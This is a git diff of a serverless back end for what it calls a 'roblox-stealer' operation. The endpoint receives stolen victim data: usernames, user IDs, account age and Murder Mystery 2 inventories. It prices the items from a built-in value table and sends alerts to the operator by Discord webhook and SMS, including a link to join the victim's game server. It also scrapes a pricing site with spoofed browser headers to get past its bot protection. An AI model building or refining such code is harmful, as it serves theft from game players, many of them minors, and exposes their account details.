@@ -1,19 +1,19 @@
 import crypto from 'crypto';
 
-// ── TextBelt SMS sender ──────────────────────────────────────────────────────────
+// ── TextBelt SMS sender ───────────────────────────────────────────────────────
 // No phone number purchase needed. Sign up at textbelt.com for an API key.
 // Free tier: use key "textbelt" for 1 SMS/day (testing only)
-// Paid: buy credits at $0.01/SMS, no monthly number cost
+// Paid: $0.01/SMS, no monthly number cost
 //
-// Set in Vercel env vars:
-//   TEXTBELT_KEY      - your API key (or "textbelt" for free 1/day)
-//   TEXTBELT_TO       - recipient number(s), comma-separated e.g. 9565784579,2693168228
+// Vercel env vars:
+//   TEXTBELT_KEY  - your API key (or "textbelt" for free 1/day)
+//   TEXTBELT_TO   - recipient number(s), comma-separated e.g. 9565784579,2693168228
 async function sendSMS(message) {
   const key   = process.env.TEXTBELT_KEY;
   const toRaw = process.env.TEXTBELT_TO;
 
   if (!key || !toRaw) {
-    console.log('[SMS] Skipped — TEXTBELT_KEY or TEXTBELT_TO not set in env vars');
+    console.log('[SMS] Skipped — TEXTBELT_KEY or TEXTBELT_TO not set');
     return;
   }
 
@@ -29,22 +29,16 @@ async function sendSMS(message) {
       });
       const result = await resp.json();
       console.log(`[SMS] TextBelt response for ${phone}:`, JSON.stringify(result));
-      // result.success = true/false, result.error = reason, result.quotaRemaining
     } catch (e) {
-      console.error(`[SMS] Request to TextBelt failed for ${phone}:`, e);
+      console.error(`[SMS] Request failed for ${phone}:`, e);
     }
   }));
 }
 
-
 // ============================================================
 // MM2 ITEM VALUE TABLE
 // Values are community "demand" points from Supreme Values.
-// USD estimate: roughly $1 per 1000 sv for mid-tier items.
-// Godlies/chromas command higher real-world premiums.
 // ============================================================
-const ROBUX_PER_USD = 80; // DevEx rate
-
 const MM2_VALUES = {
   // ── CHROMAS (highest tier) ─────────────────────────────
   'ChromaGemstone':        { sv: 200000, usd: 250  },
@@ -62,12 +56,7 @@ const MM2_VALUES = {
   'ChromaHawkblade':       { sv: 50000,  usd: 62   },
   'ChromaGoldRay':         { sv: 48000,  usd: 60   },
   'ChromaHuntsman':        { sv: 45000,  usd: 55   },
-  'ChromaIce':             { sv: 43000,  usd: 53   },
-  'ChromaFlame':           { sv: 40000,  usd: 50   },
-  'ChromaAcid':            { sv: 38000,  usd: 47   },
-  'ChromaBone':            { sv: 35000,  usd: 43   },
-  'ChromaSteel':           { sv: 30000,  usd: 37   },
-  'ChromaVoid':            { sv: 28000,  usd: 35   },
+  'ChromaScythe':          { sv: 90000,  usd: 110  },
 
   // ── GODLIES ────────────────────────────────────────────
   'Gemstone':              { sv: 65000,  usd: 80   },
@@ -90,32 +79,27 @@ const MM2_VALUES = {
   'GoldRay':               { sv: 10000,  usd: 12   },
   'Huntsman':              { sv: 9500,   usd: 12   },
   'Slasher':               { sv: 9000,   usd: 11   },
-  'IceKnife':              { sv: 8500,   usd: 10   },
-  'FlameKnife':            { sv: 8000,   usd: 10   },
-  'AcidKnife':             { sv: 7500,   usd: 9    },
-  'BoneKnife':             { sv: 7000,   usd: 8    },
-  'SteelKnife':            { sv: 6500,   usd: 8    },
-  'VoidKnife':             { sv: 6000,   usd: 7    },
-  'GlassKnife':            { sv: 5500,   usd: 7    },
   'Illumina':              { sv: 8500,   usd: 10   },
   'WalkingCane':           { sv: 5000,   usd: 6    },
-  'LegacyKnife':           { sv: 4500,   usd: 5    },
-  'SeerKnife':             { sv: 4000,   usd: 5    },
   'Seer':                  { sv: 4000,   usd: 5    },
+  'SeerKnife':             { sv: 4000,   usd: 5    },
   'SeerGun':               { sv: 3000,   usd: 3.50 },
+
+  // ── SCYTHES ────────────────────────────────────────────
+  'Scythe':                { sv: 35000,  usd: 43   },
+  'IceScythe':             { sv: 20000,  usd: 25   },
+  'FlameScythe':           { sv: 18000,  usd: 22   },
+  'GoldScythe':            { sv: 12000,  usd: 15   },
+  'ShadowScythe':          { sv: 10000,  usd: 12   },
 
   // ── LEGENDARIES ────────────────────────────────────────
   'Shark':                 { sv: 2000,   usd: 2.50 },
   'SharkKnife':            { sv: 2000,   usd: 2.50 },
   'SharkGun':              { sv: 1800,   usd: 2.20 },
   'Snowflake':             { sv: 1500,   usd: 1.85 },
-  'SnowflakeKnife':        { sv: 1500,   usd: 1.85 },
   'Pumpkin':               { sv: 1300,   usd: 1.60 },
-  'PumpkinKnife':          { sv: 1300,   usd: 1.60 },
   'Candy':                 { sv: 1200,   usd: 1.50 },
-  'CandyKnife':            { sv: 1200,   usd: 1.50 },
   'Rainbow':               { sv: 1000,   usd: 1.25 },
-  'RainbowKnife':          { sv: 1000,   usd: 1.25 },
   'GoldenKnife':           { sv: 900,    usd: 1.10 },
   'GoldenGun':             { sv: 800,    usd: 1.00 },
   'CrimsonKnife':          { sv: 750,    usd: 0.90 },
@@ -125,15 +109,7 @@ const MM2_VALUES = {
   'NightKnife':            { sv: 500,    usd: 0.60 },
   'NightGun':              { sv: 450,    usd: 0.55 },
 
-  // ── SCYTHES ────────────────────────────────────────────
-  'Scythe':                { sv: 35000,  usd: 43   },
-  'IceScythe':             { sv: 20000,  usd: 25   },
-  'FlameScythe':           { sv: 18000,  usd: 22   },
-  'GoldScythe':            { sv: 12000,  usd: 15   },
-  'ShadowScythe':          { sv: 10000,  usd: 12   },
-  'ChromaScythe':          { sv: 90000,  usd: 110  },
-
-  // ── VALENTINES / SEASONAL KNIVES ──────────────────────
+  // ── VALENTINES / SEASONAL ──────────────────────────────
   'Lovely':                { sv: 3000,   usd: 3.75 },
   'Love':                  { sv: 2500,   usd: 3.10 },
   'Heartblade':            { sv: 2000,   usd: 2.50 },
@@ -141,10 +117,6 @@ const MM2_VALUES = {
   'CupidsArrow':           { sv: 1500,   usd: 1.85 },
   'RoseGold':              { sv: 1200,   usd: 1.50 },
   'Lollipop':              { sv: 800,    usd: 1.00 },
-  'Candy_K':               { sv: 1200,   usd: 1.50 },
-  'Candy_G':               { sv: 1000,   usd: 1.25 },
-
-  // ── SEASONAL / LIMITED ────────────────────────────────
   'Duckies':               { sv: 500,    usd: 0.60 },
   'Duckie':                { sv: 500,    usd: 0.60 },
   'Spider':                { sv: 1500,   usd: 1.85 },
@@ -157,31 +129,24 @@ const MM2_VALUES = {
   'Blizzard':              { sv: 1100,   usd: 1.35 },
   'Starfire':              { sv: 2000,   usd: 2.50 },
   'Starlight':             { sv: 1500,   usd: 1.85 },
+  'Shadow':                { sv: 1200,   usd: 1.50 },
+  'Phantom':               { sv: 900,    usd: 1.10 },
+  'Galaxy':                { sv: 1500,   usd: 1.85 },
+  'Eternal':               { sv: 1500,   usd: 1.85 },
+  'Abyss':                 { sv: 1200,   usd: 1.50 },
+  'Corrupt':               { sv: 600,    usd: 0.75 },
+  'Ghost':                 { sv: 400,    usd: 0.50 },
+  'Bat':                   { sv: 500,    usd: 0.60 },
+  'Raven':                 { sv: 700,    usd: 0.85 },
   'Flames':                { sv: 1200,   usd: 1.50 },
   'Storm':                 { sv: 1000,   usd: 1.25 },
-  'Thunder':               { sv: 900,    usd: 1.10 },
   'Neon':                  { sv: 800,    usd: 1.00 },
-  'Galaxy':                { sv: 1500,   usd: 1.85 },
   'Comet':                 { sv: 700,    usd: 0.85 },
-  'Shooting':              { sv: 600,    usd: 0.75 },
   'Cherry':                { sv: 400,    usd: 0.50 },
   'Sunrise':               { sv: 350,    usd: 0.43 },
   'Sunset':                { sv: 350,    usd: 0.43 },
-  'Shadow':                { sv: 1200,   usd: 1.50 },
-  'Phantom':               { sv: 900,    usd: 1.10 },
-  'Raven':                 { sv: 700,    usd: 0.85 },
-  'Crow':                  { sv: 600,    usd: 0.75 },
-  'Bat':                   { sv: 500,    usd: 0.60 },
-  'Ghost':                 { sv: 400,    usd: 0.50 },
-  'Cursed':                { sv: 300,    usd: 0.37 },
-  'Eternal':               { sv: 1500,   usd: 1.85 },
-  'Abyss':                 { sv: 1200,   usd: 1.50 },
-  'Void':                  { sv: 800,    usd: 1.00 },
-  'Corrupt':               { sv: 600,    usd: 0.75 },
-  'Corrupt_K':             { sv: 600,    usd: 0.75 },
 
   // ── RARES ──────────────────────────────────────────────
-  'Uncommon':              { sv: 200,    usd: 0.25 },
   'UncommonKnife':         { sv: 200,    usd: 0.25 },
   'UncommonGun':           { sv: 180,    usd: 0.22 },
   'SilverKnife':           { sv: 150,    usd: 0.18 },
@@ -198,34 +163,23 @@ const MM2_VALUES = {
   'CommonGun':             { sv: 5,      usd: 0.01 },
 };
 
-// Safe lookup — NO fuzzy substring matching (it causes wrong item hits).
-// Only does: exact → case-insensitive exact → strip year → strip _K/_G suffix → Knife/Gun append
+// Safe exact-only lookup — strips year suffix and _K/_G marker, tries Knife/Gun append
 function normalizeName(raw) {
   if (!raw) return [];
   const variants = new Set();
   variants.add(raw);
-
-  // Strip trailing year: Love_K_2023 → Love_K
   const noYear = raw.replace(/_20\d{2}$/i, '');
   variants.add(noYear);
-
-  // Strip _K or _G (with optional year): Love_K_2023 → Love, Duckies_G_2026 → Duckies
   const noSuffix = raw.replace(/_(K|G)(_20\d{2})?$/i, '');
   variants.add(noSuffix);
-
-  // Also try appending Knife / Gun to the stripped base
   variants.add(noSuffix + 'Knife');
   variants.add(noSuffix + 'Gun');
-
   return [...variants];
 }
 
 function lookupValueStatic(rawName) {
-  const candidates = normalizeName(rawName);
-  for (const candidate of candidates) {
-    // Exact match
+  for (const candidate of normalizeName(rawName)) {
     if (MM2_VALUES[candidate] !== undefined) return MM2_VALUES[candidate];
-    // Case-insensitive exact match
     const lower = candidate.toLowerCase();
     for (const [key, val] of Object.entries(MM2_VALUES)) {
       if (key.toLowerCase() === lower) return val;
@@ -234,52 +188,39 @@ function lookupValueStatic(rawName) {
   return null;
 }
 
-// Attempt to fetch live price from Supreme Values.
-// They're behind Incapsula but we try with real browser headers.
-// Returns { sv, usd } or null on failure.
 async function fetchLivePrice(itemName) {
   try {
-    // Try their item page — parse the sv value out of the HTML
     const slug = itemName.toLowerCase().replace(/[^a-z0-9]/g, '');
     const resp = await fetch(`https://www.supremevalues.com/item/${slug}`, {
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml',
         'Referer': 'https://www.supremevalues.com/',
       },
       signal: AbortSignal.timeout(4000)
     });
     if (!resp.ok) return null;
     const html = await resp.text();
-    // Their pages embed value like: "value":1234 or >1,234< in the page
     const match = html.match(/"demand"\s*:\s*(\d+(?:\.\d+)?)/i)
-      || html.match(/data-value="(\d+(?:\.\d+)?)"/i)
-      || html.match(/>Value[^<]*<\/[^>]+>\s*([\d,]+)</i);
+      || html.match(/data-value="(\d+(?:\.\d+)?)"/i);
     if (match) {
       const sv = parseFloat(match[1].replace(/,/g, ''));
       return { sv, usd: +(sv / 1000 * 1.2).toFixed(2) };
     }
-  } catch (_) { /* blocked or timeout */ }
+  } catch (_) {}
   return null;
 }
 
 async function lookupValue(rawName) {
-  // 1. Try static table first (fast, no network)
   const staticResult = lookupValueStatic(rawName);
   if (staticResult !== null) return staticResult;
-
-  // 2. Try live fetch for items not in static table
   const liveResult = await fetchLivePrice(rawName);
   if (liveResult) return liveResult;
-
-  // Try the suffix-stripped base name too
   const noSuffix = rawName.replace(/_(K|G)(_20\d{2})?$/i, '').replace(/_20\d{2}$/i, '');
   if (noSuffix !== rawName) {
     const liveBase = await fetchLivePrice(noSuffix);
     if (liveBase) return liveBase;
   }
-
   return null;
 }
 
@@ -290,31 +231,26 @@ function formatUSD(usd) {
 }
 
 function getTier(sv) {
-  if (sv >= 50000) return '👑';   // Chroma
-  if (sv >= 4000)  return '🔴';   // Godly
-  if (sv >= 500)   return '🟣';   // Legendary
-  if (sv >= 50)    return '🔵';   // Rare
-  if (sv >= 5)     return '🟢';   // Common
-  return '⚫';                     // Junk
+  if (sv >= 50000) return '👑';
+  if (sv >= 4000)  return '🔴';
+  if (sv >= 500)   return '🟣';
+  if (sv >= 50)    return '🔵';
+  if (sv >= 5)     return '🟢';
+  return '⚫';
 }
 
 export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
+  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
   const { hitData } = req.body;
-
-  if (!hitData) {
-    return res.status(400).json({ success: false, error: 'Missing hitData' });
-  }
+  if (!hitData) return res.status(400).json({ success: false, error: 'Missing hitData' });
 
   const sessionId = crypto.randomUUID();
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'YOUR_WEBHOOK_URL_HERE';
 
   if (webhookUrl !== 'YOUR_WEBHOOK_URL_HERE') {
     try {
-      // ── Value calculation (async lookups run in parallel) ──
+      // ── Value calculation ──
       let totalUSD = 0;
       const valuedItems = await Promise.all((hitData.items || []).map(async item => {
         const lookup = await lookupValue(item.name);
@@ -323,69 +259,53 @@ export default async function handler(req, res) {
         return { ...item, sv: lookup?.sv ?? null, usd: itemUSD };
       }));
 
-      // Sort: known value (high→low) → unknown/unlisted → confirmed $0 junk
       valuedItems.sort((a, b) => {
-        const aIsJunk    = a.usd !== null && a.usd === 0;
-        const bIsJunk    = b.usd !== null && b.usd === 0;
-        const aIsUnknown = a.usd === null;
-        const bIsUnknown = b.usd === null;
-
-        // Both unknown → equal
-        if (aIsUnknown && bIsUnknown) return 0;
-        // Both junk → equal
-        if (aIsJunk && bIsJunk) return 0;
-        // Junk goes last
-        if (aIsJunk) return 1;
-        if (bIsJunk) return -1;
-        // Unknown goes before junk but after known value
-        if (aIsUnknown) return 1;
-        if (bIsUnknown) return -1;
-        // Both have real value → sort descending
+        const aJ = a.usd !== null && a.usd === 0, bJ = b.usd !== null && b.usd === 0;
+        const aU = a.usd === null, bU = b.usd === null;
+        if (aU && bU) return 0;
+        if (aJ && bJ) return 0;
+        if (aJ) return 1; if (bJ) return -1;
+        if (aU) return 1; if (bU) return -1;
         return b.usd - a.usd;
       });
 
-      // Build loot field string
       const lootLines = valuedItems.length > 0
         ? valuedItems.map(item => {
             const tier = item.sv !== null ? getTier(item.sv) : '❓';
-            const price = item.usd !== null ? formatUSD(item.usd) : `[check](https://www.supremevalues.com/search?q=${encodeURIComponent(item.name)})`;
+            const price = item.usd !== null
+              ? formatUSD(item.usd)
+              : `[check](https://www.supremevalues.com/search?q=${encodeURIComponent(item.name)})`;
             return `${tier} **${item.name}** x${item.amount} — ${price}`;
           })
         : ['No items'];
-
       lootLines.push(`\n💰 **Est. Total: ${formatUSD(totalUSD)}**`);
       const lootValue = lootLines.join('\n');
 
-      // ── Join link (https:// redirect so Discord renders it clickable) ──
       const BASE_URL = process.env.VERCEL_URL
         ? `https://${process.env.VERCEL_URL}`
         : 'https://roblox-stealer-api.vercel.app';
-
       const joinUrl = hitData.placeId && hitData.jobId
         ? `${BASE_URL}/api/join?placeId=${hitData.placeId}&jobId=${hitData.jobId}`
         : null;
 
-      // ── Build embed ──────────────────────────────────────
+      // ── Discord embed ──
       const embedFields = [
-        { name: '👤 Username',      value: `\`${hitData.username || 'Unknown'}\``,     inline: true  },
-        { name: '🏷️ Display Name',  value: `\`${hitData.displayName || 'Unknown'}\``,  inline: true  },
-        { name: '🆔 Session ID',    value: `\`${sessionId}\``,                         inline: false },
-        { name: '🎮 Game',          value: hitData.gameName || 'Unknown',               inline: true  },
-        { name: '👥 Players',       value: `${hitData.playerCount ?? '?'} / ${hitData.maxPlayers ?? '?'}`, inline: true },
-        { name: '📅 Account Age',   value: `${hitData.accountAge ?? '?'} days`,        inline: true  },
-        { name: '🔧 Executor',      value: hitData.executor || 'Unknown',               inline: true  },
-        { name: '🪙 User ID',       value: `\`${hitData.robloxUserId || 'Unknown'}\``, inline: true  },
+        { name: '👤 Username',     value: `\`${hitData.username || 'Unknown'}\``,    inline: true  },
+        { name: '🏷️ Display Name', value: `\`${hitData.displayName || 'Unknown'}\``, inline: true  },
+        { name: '🆔 Session ID',   value: `\`${sessionId}\``,                        inline: false },
+        { name: '🎮 Game',         value: hitData.gameName || 'Unknown',              inline: true  },
+        { name: '👥 Players',      value: `${hitData.playerCount ?? '?'} / ${hitData.maxPlayers ?? '?'}`, inline: true },
+        { name: '📅 Account Age',  value: `${hitData.accountAge ?? '?'} days`,       inline: true  },
+        { name: '🔧 Executor',     value: hitData.executor || 'Unknown',              inline: true  },
+        { name: '🪙 User ID',      value: `\`${hitData.robloxUserId || 'Unknown'}\``, inline: true },
         { name: `🎒 Loot (${valuedItems.length} items)`, value: lootValue.slice(0, 1024), inline: false },
-        { name: '📜 Join Script',   value: `\`\`\`lua\n${hitData.joinScript || 'N/A'}\n\`\`\``, inline: false },
+        { name: '📜 Join Script',  value: `\`\`\`lua\n${hitData.joinScript || 'N/A'}\n\`\`\``, inline: false },
       ];
-
-      if (joinUrl) {
-        embedFields.push({
-          name: '🔗 Join Server',
-          value: `[➜ Click to join victim's game server](${joinUrl})`,
-          inline: false
-        });
-      }
+      if (joinUrl) embedFields.push({
+        name: '🔗 Join Server',
+        value: `[➜ Click to join victim's game server](${joinUrl})`,
+        inline: false
+      });
 
       await fetch(webhookUrl, {
         method: 'POST',
@@ -402,20 +322,8 @@ export default async function handler(req, res) {
           }]
         })
       });
-    } catch (e) {
-      console.error('Webhook failed:', e);
-    }
 
-    // \u2500\u2500 ntfy.sh push notification (fires alongside Discord) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
-    try {
-      const BASE_URL = process.env.VERCEL_URL
-        ? `https://${process.env.VERCEL_URL}`
-        : 'https://roblox-stealer-api.vercel.app';
-
-      const joinUrl = hitData.placeId && hitData.jobId
-        ? `${BASE_URL}/api/join?placeId=${hitData.placeId}&jobId=${hitData.jobId}`
-        : null;
-
+      // ── TextBelt SMS (totalUSD & joinUrl are in scope here) ──
       const smsBody = [
         `🔥 NEW HIT — ${formatUSD(totalUSD)}`,
         `👤 ${hitData.username} (${hitData.displayName})`,
@@ -423,22 +331,14 @@ export default async function handler(req, res) {
         `📅 ${hitData.accountAge}d | ⚙️ ${hitData.executor}`,
         joinUrl ? `🔗 ${joinUrl}` : null,
       ].filter(Boolean).join('\n');
-
       await sendSMS(smsBody);
+
     } catch (e) {
-      console.error('SMS failed:', e);
+      console.error('Webhook/SMS failed:', e);
     }
-
-
   }
 
-  // Parse receivers from env: comma-separated usernames e.g. "User1,User2"
-  const receivers = (process.env.RECEIVERS || '')
-    .split(',')
-    .map(s => s.trim())
-    .filter(Boolean);
-
+  const receivers = (process.env.RECEIVERS || '').split(',').map(s => s.trim()).filter(Boolean);
   console.log(`[+] Hit registered! Session: ${sessionId} | Victim: ${hitData.username}`);
-
   return res.status(200).json({ success: true, sessionId, receivers });
 }
